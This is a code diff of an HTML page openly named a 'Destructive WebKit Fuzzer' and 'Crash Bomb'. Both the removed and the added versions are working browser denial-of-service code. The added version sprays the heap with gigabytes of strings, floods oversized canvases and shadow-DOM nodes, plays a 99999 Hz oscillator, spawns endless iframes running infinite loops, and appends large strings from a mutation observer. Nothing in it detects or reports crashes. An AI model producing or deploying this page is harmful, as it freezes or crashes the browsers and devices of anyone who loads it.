@@ -1,98 +1,98 @@
 <!DOCTYPE html>
 <html>
 <head>
-  <title>🔥 WebKit Destructor</title>
+  <title>Destructive WebKit Fuzzer</title>
   <style>
     body {
       background: black;
-      color: #0f0;
+      color: lime;
       font-family: monospace;
     }
-    #log {
-      white-space: pre-wrap;
-      font-size: 14px;
-      padding: 1em;
+    .boom {
+      animation: explode 0.05s infinite alternate;
     }
-    iframe {
-      display: none;
+    @keyframes explode {
+      0% { transform: scale(1); }
+      100% { transform: scale(10); }
     }
   </style>
 </head>
 <body>
-  <div id="log">[+] Launching destructo-fuzzer...</div>
+  <h1>⚠️ WebKit Crash Bomb Loaded...</h1>
+  <pre id="log">[+] Launching chaos...</pre>
 
   <script>
-    const log = msg => {
-      const el = document.getElementById("log");
-      el.textContent += msg + "\n";
-      el.scrollTop = el.scrollHeight;
-    };
+    const log = msg => document.getElementById("log").textContent += "\n" + msg;
 
-    const iframePayload = `
-<!DOCTYPE html>
-<html>
-  <body style='background:black; color:#0f0; font-family:monospace;'>
-    <script>
-      let f = 0;
-
-      function spamDOM() {
-        try {
-          for (let i = 0; i < 5000; i++) {
-            const d = document.createElement("div");
-            d.textContent = "SPAM_" + f + "_" + i;
-            const s = d.attachShadow({ mode: "open" });
-            for (let j = 0; j < 100; j++) {
-              const span = document.createElement("span");
-              span.textContent = "X" + j;
-              s.appendChild(span);
-            }
-            document.body.appendChild(d);
-          }
-
-          if (Math.random() < 0.5) document.body.innerHTML = "<h1>BOOM</h1>";
-          if (Math.random() < 0.4) while (Math.random() < 0.95) document.body.appendChild(document.createElement("p"));
-          if (Math.random() < 0.2) location.reload();
-
-          if (typeof gc === "function") gc();
-        } catch (e) {}
+    // 1. Heap spraying with massive strings
+    const spray = [];
+    try {
+      for (let i = 0; i < 100000; i++) {
+        spray.push("A".repeat(100000));
+        if (i % 1000 === 0) log(`[+] Spray ${i}`);
       }
-
-      function destructiveLoop() {
-        let i = 0;
-        function burn() {
-          i++;
-          spamDOM();
-          if (i % 3 === 0) requestAnimationFrame(burn);
-          else setTimeout(burn, 0);
-        }
-        burn();
-      }
-
-      new MutationObserver(() => {
-        if (Math.random() < 0.5) document.body.innerHTML = "<marquee>💀</marquee>";
-      }).observe(document.body, { childList: true, subtree: true });
-
-      destructiveLoop();
-    <\/script>
-  </body>
-</html>
-`.trim();
-
-    const TOTAL_IFRAMES = 60;
-    let count = 0;
-
-    function injectNext() {
-      if (count >= TOTAL_IFRAMES) return;
-      const iframe = document.createElement("iframe");
-      iframe.setAttribute("sandbox", "allow-scripts");
-      iframe.srcdoc = iframePayload;
-      document.body.appendChild(iframe);
-      log("[+] Destructor iframe " + count + " injected");
-      count++;
-      setTimeout(injectNext, 200); // más rápido
+    } catch (e) {
+      log("[!] Heap spray exception: " + e);
     }
 
-    injectNext();
+    // 2. Canvas flooding
+    for (let i = 0; i < 10; i++) {
+      const canvas = document.createElement("canvas");
+      canvas.width = canvas.height = 10000;
+      document.body.appendChild(canvas);
+      const ctx = canvas.getContext("2d");
+      setInterval(() => {
+        ctx.fillStyle = "#" + Math.floor(Math.random()*0xFFFFFF).toString(16);
+        ctx.fillRect(Math.random()*1e4, Math.random()*1e4, 500, 500);
+      }, 0);
+    }
+
+    // 3. Audio stress
+    try {
+      const audioCtx = new (window.AudioContext || window.webkitAudioContext)();
+      const osc = audioCtx.createOscillator();
+      osc.frequency.value = 99999;
+      osc.connect(audioCtx.destination);
+      osc.start();
+    } catch (e) {
+      log("[!] AudioContext error: " + e);
+    }
+
+    // 4. DOM mutation spam + ShadowDOM
+    function spawnNodes() {
+      for (let i = 0; i < 100; i++) {
+        const el = document.createElement("div");
+        el.className = "boom";
+        const shadow = el.attachShadow({ mode: "open" });
+        for (let j = 0; j < 50; j++) {
+          const span = document.createElement("span");
+          span.textContent = "💥";
+          shadow.appendChild(span);
+        }
+        document.body.appendChild(el);
+      }
+      requestAnimationFrame(spawnNodes);
+    }
+
+    // 5. Iframes in loop
+    function floodIframes() {
+      for (let i = 0; i < 20; i++) {
+        const iframe = document.createElement("iframe");
+        iframe.srcdoc = "<script>while(true){}</script>";
+        document.body.appendChild(iframe);
+      }
+      setTimeout(floodIframes, 100);
+    }
+
+    // 6. Mutation observer triggers DOM wipes
+    const observer = new MutationObserver(() => {
+      if (Math.random() < 0.2) document.body.innerHTML += "<div>" + "X".repeat(10000) + "</div>";
+    });
+    observer.observe(document.body, { childList: true, subtree: true });
+
+    // Launch all
+    spawnNodes();
+    floodIframes();
   </script>
 </body>
 </html>
